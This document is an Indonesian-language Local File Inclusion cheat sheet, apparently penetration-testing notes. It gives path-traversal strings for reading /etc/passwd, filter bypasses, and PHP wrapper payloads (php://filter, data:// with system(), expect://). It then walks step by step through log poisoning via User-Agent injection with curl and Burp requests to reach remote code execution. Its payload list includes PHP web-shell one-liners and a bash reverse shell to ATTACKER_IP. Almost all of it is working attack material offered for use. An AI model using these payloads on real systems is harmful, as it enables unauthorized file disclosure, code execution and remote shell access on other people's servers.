# LFI (Local File Inclusion)

## Path Traversal
```text
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00          # null byte (PHP lama)
?page=....//....//....//etc/passwd       # bypass filter ../
```

## PHP Wrappers
```text
?page=php://filter/convert.base64-encode/resource=index.php
# untuk membaca file seperti config.php, database.php, atau file .env dan seluruh file

?page=data://text/plain,<?php system($_GET['cmd']);?>
# RCE / mengeksekusi skrip PHP buatanmu sendiri secara langsung dari UR

?page=expect://id
# menjalankan perintah sistem operasi

```

## Log Poisoning (LFI -> RCE)

### Lokasi Log Files
```text
# Apache (Web Server)
/var/log/apache2/access.log       # Log pengunjung (biasanya diserang via User-Agent)
/var/log/apache2/error.log        # Log error (biasanya diserang dengan sengaja membuat error URL)
/var/log/httpd/access_log         # Sama seperti apache2 (untuk distro Linux tertentu seperti CentOS/RHEL)
/var/log/httpd/error_log          # Sama seperti apache2 (untuk distro Linux tertentu seperti CentOS/RHEL)

# Nginx (Web Server)
/var/log/nginx/access.log         # Log pengunjung Nginx
/var/log/nginx/error.log          # Log error Nginx

# FTP (File Transfer Protocol)
/var/log/vsftpd.log               # Log FTP (biasanya diserang dengan login menggunakan username berupa kode PHP)
```

### Apache/Nginx Access Log Poisoning
```bash
# Step 1: Inject PHP ke User-Agent
# Payload akan tercatat ke access.log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include access.log melalui LFI
# Apache
http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id

# Nginx
http://target.com/vuln.php?page=/var/log/nginx/access.log&cmd=whoami

#Keterangan:
Teknik ini memanfaatkan LFI untuk membaca access log yang sebelumnya telah
dipengaruhi melalui input HTTP seperti User-Agent. Jika isi log diproses
sebagai kode PHP, kondisi tersebut dapat menyebabkan RCE.
```

**Burp Suite Request (Inject User-Agent):**

Mengirim payload melalui User-Agent agar tercatat di access.log.
```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml
Connection: close
```

**Burp Suite Request (Trigger RCE via LFI):**

```http
GET /vuln.php?page=/var/log/apache2/access.log&cmd=id HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Connection: close

#Keterangan:
Memanggil access.log melalui parameter LFI.
Jika log diproses sebagai PHP, command dapat dieksekusi.
```

### Useful Payloads
```php

# Simple command execution
<?php system($_GET['cmd']); ?>           # Menjalankan command melalui shell
<?php passthru($_GET['cmd']); ?>         # Menjalankan command dan menampilkan output
<?php echo shell_exec($_GET['cmd']); ?>  # Menjalankan command dan mengembalikan output

# Reverse shell
<?php system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'); ?>
# Membuat koneksi shell dari target ke mesin penguji

# Base64 encoded payload
<?php system(base64_decode('aWQ=')); ?>
# aWQ= merupakan encoding Base64 dari command "id"
```

### Tips
- Jika log file terlalu besar, server mungkin timeout - coba error.log (biasanya lebih kecil)
- Cek permission file log (www-data harus bisa read)
- Gunakan Burp untuk inject payload agar tidak ter-encode oleh terminal
